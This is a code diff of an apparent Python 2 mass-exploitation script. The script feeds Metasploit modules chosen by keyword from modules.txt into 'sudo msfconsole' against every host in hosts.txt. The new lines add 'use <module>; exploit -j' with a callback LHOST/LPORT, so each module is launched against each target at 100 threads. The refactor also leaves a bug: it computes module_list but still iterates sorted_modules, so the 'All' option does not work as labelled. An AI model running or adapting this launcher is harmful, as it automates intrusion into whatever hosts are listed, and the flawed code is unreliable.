@@ -109,10 +109,10 @@ def exploit(query):
     with open("modules.txt", "rb") as infile:
         for i in xrange(toolbar_width):
             time.sleep(0.1)
-            for lines in infile:
-                all_modules.append(lines)
-                if query in lines:
-                    sorted_modules.append(lines)
+            for line in infile:
+                all_modules.append(line)
+                if query in line:
+                    sorted_modules.append(line)
 
             # update the bar
             sys.stdout.write('\033[94m' + "|" + '\033[0m')
@@ -127,19 +127,13 @@ def exploit(query):
     # a more directed approach with the sorted modules.
     choice = raw_input("\n[" + t.magenta("?") + "]Run sorted or all modules against targets? [S]orted/[A]ll: ").lower()
 
-    if choice == 's':
+    if (choice == 's') or (choice == 'a'):
         with open("hosts.txt", "rb") as host_list:
             for rhosts in host_list:
-                for exploit in sorted_modules:
-                    template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
-                    workspace, local_host, local_port, rhosts, exploit)
-                    os.system(template)
-    elif choice == 'a':
-        with open("hosts.txt", "rb") as host_list:
-            for rhosts in host_list:
-                for exploit in all_modules:
-                    template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
-                    workspace, local_host, local_port, rhosts, exploit)
+                module_list = (sorted_modules if choice=='s' else all_modules)
+                for module in sorted_modules:
+                    template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; use %s; exploit -j;'" % (
+                    workspace, local_host, local_port, rhosts, module)
                     os.system(template)
     else:
         print "[" + t.red("!") + "]Unhandled Option. Defaulting to Main Menu"
